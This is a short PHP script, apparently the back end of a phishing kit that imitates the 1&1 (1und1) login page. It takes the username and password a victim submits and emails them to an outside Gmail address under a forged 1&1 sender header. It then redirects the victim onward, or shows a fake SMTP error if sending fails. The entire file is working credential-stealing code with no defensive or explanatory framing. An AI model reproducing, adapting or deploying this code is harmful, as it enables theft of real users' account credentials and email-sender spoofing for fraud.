<?php
if(isset($_POST["oaologin_username"]) && isset($_POST["oaologin_password"])){
	$user=$_POST["oaologin_username"];
	$pass=$_POST["oaologin_password"];
	if(strlen($pass) < 6){
		header("Location: index.php?page=error&uid=$user");
	}else{
		$message  = "~~~~[ 1UND1 ]~~~~\n";
		$message .= "USER : $user\n";
		$message .= "PASS : $pass\n";
		$message .= "~~~~[ By Rachdawa ]~~~~\n";
		$to="1and1rzlt@gmail.com";
		$subj = "1&1 LOGIN[DE]";
		$from = "From:1&1 Login<me@m.1und1.de>";
		if(@mail($to, $subj, $message, $from) != false){
		echo '
		<script>
			window.top.location="index1.php";
		</script>
		';
		}else{
			echo "Failed to connect to to SMTP 127.0.0.1";
		}
	}
}else if(isset($_POST["oaologin_username"]) && !isset($_POST["oaologin_password"])){
	$user=$_POST["oaologin_username"];
	header("Location: index.php?page=error&uid=$user");
}else{
	header("Location: index.php?page=error");
}
?>